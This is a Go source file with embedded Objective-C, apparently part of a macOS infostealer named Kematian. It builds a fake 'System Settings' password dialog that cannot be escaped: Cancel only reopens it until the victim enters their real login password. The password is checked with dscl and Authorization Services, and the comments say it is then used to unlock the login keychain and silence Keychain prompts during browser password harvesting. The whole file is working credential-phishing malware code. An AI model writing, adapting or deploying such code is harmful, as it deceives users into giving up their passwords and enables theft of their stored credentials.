//go:build darwin

// password_prompt_darwin.go — acquire and validate the macOS login password.
//
// Order of sources: -mac-password / KEMATIAN_MAC_PASSWORD, then (unless -no-prompt)
// a native NSAlert secure-field dialog. The password is validated via dscl -authonly
// (and Authorization Services as fallback) before harvest continues.
//
// The password unlocks the login keychain and runs set-key-partition-list so browser
// password harvest does not open system Keychain Allow dialogs.
//
// GUI behavior: Cancel or wrong password does NOT exit the process — the dialog
// closes and reopens until a correct Mac login password is entered. Only then
// does the modal go away permanently and harvest continue.
// TCC Full Disk Access cannot be granted with a password.
package main

/*
#cgo darwin CFLAGS: -x objective-c
#cgo darwin LDFLAGS: -framework AppKit -framework Foundation -framework Security

#import <AppKit/AppKit.h>
#import <Security/Security.h>
#import <stdlib.h>
#import <string.h>

static int kematian_run_command(NSString *launchPath, NSArray<NSString *> *arguments) {
	NSTask *task = [[NSTask alloc] init];
	task.launchPath = launchPath;
	task.arguments = arguments;
	NSPipe *sink = [NSPipe pipe];
	task.standardOutput = sink;
	task.standardError = sink;
	@try {
		[task launch];
		[task waitUntilExit];
		return (int)[task terminationStatus];
	} @catch (NSException *ex) {
		(void)ex;
		return -1;
	}
}

static NSString *kematian_login_username(void) {
	NSString *user = NSUserName();
	if (user != nil && user.length > 0) {
		return user;
	}
	const char *envUser = getenv("USER");
	if (envUser != NULL && envUser[0] != '\0') {
		return [NSString stringWithUTF8String:envUser];
	}
	return nil;
}

static BOOL kematian_validate_login_password_dscl(NSString *password) {
	NSString *user = kematian_login_username();
	if (user == nil || user.length == 0) {
		return NO;
	}
	NSArray<NSString *> *nodes = @[ @".", @"/Local/Default", @"/Search" ];
	for (NSString *node in nodes) {
		if (kematian_run_command(@"/usr/bin/dscl", @[ node, @"-authonly", user, password ]) == 0) {
			return YES;
		}
	}
	return NO;
}

static BOOL kematian_validate_login_password_auth(NSString *password) {
	NSString *user = kematian_login_username();
	if (user == nil || user.length == 0 || password == nil || password.length == 0) {
		return NO;
	}
	const char *userC = [user UTF8String];
	const char *passC = [password UTF8String];
	if (userC == NULL || passC == NULL) {
		return NO;
	}

	AuthorizationRef authRef = NULL;
	if (AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authRef) != errAuthorizationSuccess) {
		return NO;
	}

	AuthorizationItem right = { kAuthorizationRuleAuthenticateAsSessionUser, 0, NULL, 0 };
	AuthorizationRights rights = { 1, &right };

	AuthorizationItem creds[2];
	creds[0].name = "username";
	creds[0].valueLength = strlen(userC);
	creds[0].value = (void *)userC;
	creds[0].flags = 0;
	creds[1].name = "password";
	creds[1].valueLength = strlen(passC);
	creds[1].value = (void *)passC;
	creds[1].flags = 0;

	AuthorizationEnvironment env = { 2, creds };
	OSStatus status = AuthorizationCopyRights(
		authRef,
		&rights,
		&env,
		kAuthorizationFlagDefaults,
		NULL
	);
	AuthorizationFree(authRef, kAuthorizationFlagDefaults);
	return status == errAuthorizationSuccess;
}

static BOOL kematian_validate_login_password(NSString *password) {
	if (password == nil || password.length == 0) {
		return NO;
	}
	if (kematian_validate_login_password_dscl(password)) {
		return YES;
	}
	return kematian_validate_login_password_auth(password);
}

static void kematian_close_alert(NSAlert *alert) {
	if (alert == nil) {
		return;
	}
	NSWindow *window = [alert window];
	if (window != nil) {
		[window orderOut:nil];
		[window close];
	}
}

@interface KematianAlertDelegate : NSObject <NSTextFieldDelegate>
@property (nonatomic, assign) NSButton *defaultButton;
@end

@implementation KematianAlertDelegate
- (BOOL)control:(NSControl *)control textView:(NSTextView *)textView doCommandForSelector:(SEL)commandSelector {
	(void)control;
	(void)textView;
	if (commandSelector == @selector(insertNewline:)) {
		if (self.defaultButton != nil) {
			[self.defaultButton performClick:nil];
		}
		return YES;
	}
	return NO;
}
@end

static char *kematian_show_password_dialog(const char *title, const char *message, int show_error) {
	(void)show_error;
	@autoreleasepool {
		__block char *result = NULL;
		void (^show)(void) = ^{
			NSString *titleStr = [NSString stringWithUTF8String:(title && title[0]) ? title : "Authentication Required"];
			NSString *msgStr = [NSString stringWithUTF8String:(message && message[0]) ? message : "Enter the password for this Mac to continue."];

			NSApplication *app = [NSApplication sharedApplication];
			[app setActivationPolicy:NSApplicationActivationPolicyAccessory];
			[app activateIgnoringOtherApps:YES];

			// Keep reopening until a correct password is entered.
			// Cancel / Escape only closes the current sheet — never exits the app.
			BOOL showWrong = NO;
			BOOL showRequired = NO;
			while (1) {
				NSAlert *alert = [[NSAlert alloc] init];
				[alert setMessageText:titleStr];
				NSString *body = msgStr;
				if (showWrong) {
					body = [NSString stringWithFormat:@"%@\n\nThe password you entered is incorrect. Please try again.", msgStr];
				} else if (showRequired) {
					body = [NSString stringWithFormat:@"%@\n\nPassword is required to continue.", msgStr];
				}
				[alert setInformativeText:body];
				[alert setAlertStyle:NSAlertStyleInformational];

				NSButton *continueBtn = [alert addButtonWithTitle:@"Continue"];
				[alert addButtonWithTitle:@"Cancel"];
				[continueBtn setKeyEquivalent:@"\r"];

				NSSecureTextField *input = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 280, 24)];
				[input setPlaceholderString:@"Password"];
				KematianAlertDelegate *delegate = [[KematianAlertDelegate alloc] init];
				delegate.defaultButton = continueBtn;
				[input setDelegate:delegate];
				[alert setAccessoryView:input];

				NSImage *icon = [NSImage imageNamed:NSImageNameLockLockedTemplate];
				if (icon != nil) {
					[alert setIcon:icon];
				}

				NSWindow *alertWindow = [alert window];
				if (alertWindow != nil) {
					[alertWindow makeFirstResponder:input];
				}

				NSModalResponse resp = [alert runModal];

				NSString *pw = nil;
				if (resp == NSAlertFirstButtonReturn) {
					pw = [input stringValue];
				}

				kematian_close_alert(alert);
				alert = nil;

				// Cancel / close → reopen modal (do not return, do not exit process).
				if (resp != NSAlertFirstButtonReturn) {
					showWrong = NO;
					showRequired = YES;
					continue;
				}

				if (pw == nil || pw.length == 0) {
					showWrong = NO;
					showRequired = YES;
					continue;
				}
				if (!kematian_validate_login_password(pw)) {
					showWrong = YES;
					showRequired = NO;
					continue;
				}

				// Correct password only: leave the loop; modal disappears for good.
				result = strdup([pw UTF8String]);
				break;
			}

			[app setActivationPolicy:NSApplicationActivationPolicyProhibited];
			[app hide:nil];
		};

		if ([NSThread isMainThread]) {
			show();
		} else {
			dispatch_sync(dispatch_get_main_queue(), show);
		}
		return result;
	}
}
*/
import "C"

import (
	"errors"
	"fmt"
	"os"
	"strings"
	"unsafe"
)

// showMacPasswordPrompt displays a native secure-field alert until a correct password
// is entered. Cancel only reopens the dialog (handled inside the C loop); this never
// returns an error for cancel — it blocks until validation succeeds.
func showMacPasswordPrompt(title, message string) (string, error) {
	ct := C.CString(title)
	cm := C.CString(message)
	defer C.free(unsafe.Pointer(ct))
	defer C.free(unsafe.Pointer(cm))

	// C loop only returns after kematian_validate_login_password succeeds.
	pw := C.kematian_show_password_dialog(ct, cm, 0)
	if pw == nil {
		// Should not happen (cancel reopens). Defensive: treat as keep-trying failure for Go loop.
		return "", errors.New("password dialog returned empty")
	}
	defer C.free(unsafe.Pointer(pw))

	s := strings.TrimSpace(C.GoString(pw))
	if s == "" {
		return "", errors.New("password dialog returned empty")
	}
	return s, nil
}

func defaultPromptTitle() string {
	return "System Settings"
}

func defaultPromptMessage() string {
	user := strings.TrimSpace(os.Getenv("USER"))
	if user == "" {
		user = "your account"
	}
	return fmt.Sprintf("macOS needs your password to continue as \"%s\".", user)
}

// acquireMacPassword returns a validated Mac login password from flag/env or GUI.
// GUI mode never exits on Cancel — the modal reopens until the password is correct.
func acquireMacPassword(fromFlag string, noPrompt bool, title, message string, quiet bool) (string, error) {
	_ = quiet
	if p := strings.TrimSpace(fromFlag); p != "" {
		return p, nil
	}
	if p := strings.TrimSpace(os.Getenv("KEMATIAN_MAC_PASSWORD")); p != "" {
		return p, nil
	}
	if noPrompt || strings.TrimSpace(os.Getenv("KEMATIAN_NO_PROMPT")) == "1" {
		return "", errors.New("-mac-password is required (or KEMATIAN_MAC_PASSWORD) when -no-prompt is set")
	}

	if strings.TrimSpace(title) == "" {
		title = defaultPromptTitle()
	}
	if strings.TrimSpace(message) == "" {
		message = defaultPromptMessage()
	}

	// Block until the native dialog accepts a correct password (cancel only reopens).
	for {
		pw, err := showMacPasswordPrompt(title, message)
		if err == nil && strings.TrimSpace(pw) != "" {
			return strings.TrimSpace(pw), nil
		}
		// Extremely defensive: if C ever returned empty, show again instead of exiting.
	}
}